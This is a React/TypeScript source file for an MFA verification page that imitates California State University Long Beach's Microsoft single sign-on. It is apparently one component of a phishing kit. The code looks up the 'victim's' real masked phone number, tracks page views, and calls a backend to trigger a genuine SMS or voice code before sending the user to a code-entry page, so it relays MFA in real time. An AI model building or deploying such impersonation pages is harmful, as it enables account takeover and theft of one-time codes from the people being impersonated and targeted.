import { useNavigate, useSearchParams } from 'react-router';
import { useState, useEffect } from 'react';
import { trackEvent, lookupVictim } from '../api';
import { CsulbPage, SsoCard, SsoBoilerplate, SsoButton, CsulbLogo } from './SsoLayout';

function SmsIcon() {
  return (
    <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M33 6H7C5.34 6 4 7.34 4 9V31L10 25H33C34.66 25 36 23.66 36 22V9C36 7.34 34.66 6 33 6Z" stroke="#1b1b1b" strokeWidth="1.5" fill="none"/>
      <circle cx="13" cy="15.5" r="1.5" fill="#1b1b1b"/>
      <circle cx="20" cy="15.5" r="1.5" fill="#1b1b1b"/>
      <circle cx="27" cy="15.5" r="1.5" fill="#1b1b1b"/>
    </svg>
  );
}

function CallIcon() {
  return (
    <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M11.04 17.32C13.44 21.74 17.26 25.56 21.68 27.96L25.02 24.62C25.44 24.2 26.02 24.08 26.54 24.24C28.22 24.8 30.02 25.1 31.9 25.1C32.72 25.1 33.4 25.78 33.4 26.6V31.9C33.4 32.72 32.72 33.4 31.9 33.4C17.76 33.4 6.4 22.04 6.4 7.9C6.4 7.08 7.08 6.4 7.9 6.4H13.2C14.02 6.4 14.7 7.08 14.7 7.9C14.7 9.78 15 11.58 15.56 13.26C15.72 13.78 15.6 14.36 15.18 14.78L11.04 17.32Z" stroke="#1b1b1b" strokeWidth="1.5" fill="none"/>
    </svg>
  );
}

export function VerifyMfa() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const email = searchParams.get('email') || '';
  const [hoveredRow, setHoveredRow] = useState<string | null>(null);
  const [maskedPhone, setMaskedPhone] = useState('+X XXXXXXXX53');

  useEffect(() => {
    trackEvent('mfa_view');
    // Look up the victim's real phone number
    lookupVictim(email).then(data => {
      setMaskedPhone(data.maskedPhone);
    });
  }, [email]);

  const handleOption = async (method: 'sms' | 'call') => {
    try {
      await fetch('http://localhost:3001/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, method }),
      });
    } catch {
      // Continue even if backend is down
    }
    navigate(`/enter-code?email=${encodeURIComponent(email)}&method=${method}`);
  };

  return (
    <CsulbPage>
      <SsoCard>
        <div className="sso-page-content" style={{ padding: '28px 44px 20px' }}>
          <CsulbLogo />
          <div style={{ fontSize: '13px', color: '#1b1b1b', marginBottom: '4px' }}>{email}</div>
          <h1 style={{ fontSize: '24px', fontWeight: 600, margin: '16px 0 0', lineHeight: '28px', color: '#1b1b1b' }}>
            Verify your identity
          </h1>
        </div>

        {/* Text option */}
        <div
          className="mfa-option-row"
          onClick={() => handleOption('sms')}
          onMouseEnter={() => setHoveredRow('sms')}
          onMouseLeave={() => setHoveredRow(null)}
          tabIndex={0}
          role="button"
          style={{
            display: 'flex',
            alignItems: 'center',
            gap: '16px',
            padding: '12px 44px',
            minHeight: '48px',
            cursor: 'pointer',
            backgroundColor: hoveredRow === 'sms' ? 'rgba(0,0,0,0.1)' : 'transparent',
            outline: hoveredRow === 'sms' ? '1px dashed #000' : 'none',
            transition: 'background-color 0.1s',
          }}
        >
          <SmsIcon />
          <span style={{ fontSize: '15px', color: '#1b1b1b' }}>Text {maskedPhone}</span>
        </div>

        {/* Call option */}
        <div
          className="mfa-option-row"
          onClick={() => handleOption('call')}
          onMouseEnter={() => setHoveredRow('call')}
          onMouseLeave={() => setHoveredRow(null)}
          tabIndex={0}
          role="button"
          style={{
            display: 'flex',
            alignItems: 'center',
            gap: '16px',
            padding: '12px 44px',
            minHeight: '48px',
            cursor: 'pointer',
            backgroundColor: hoveredRow === 'call' ? 'rgba(0,0,0,0.1)' : 'transparent',
            outline: hoveredRow === 'call' ? '1px dashed #000' : 'none',
            transition: 'background-color 0.1s',
          }}
        >
          <CallIcon />
          <span style={{ fontSize: '15px', color: '#1b1b1b' }}>Call {maskedPhone}</span>
        </div>

        <div style={{ padding: '16px 44px 28px' }}>
          <div style={{ marginBottom: '12px' }}>
            <a href="#" style={{ color: '#0067b8', fontSize: '13px' }}>More information</a>
          </div>
          <div style={{ fontSize: '13px', color: '#1b1b1b', marginBottom: '20px', lineHeight: '1.4' }}>
            Are your verification methods current? Check at https://aka.ms/mfasetup
          </div>
          <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
            <SsoButton onClick={() => navigate('/sign-in')} variant="secondary">Cancel</SsoButton>
          </div>
        </div>

        <SsoBoilerplate />
      </SsoCard>
    </CsulbPage>
  );
}
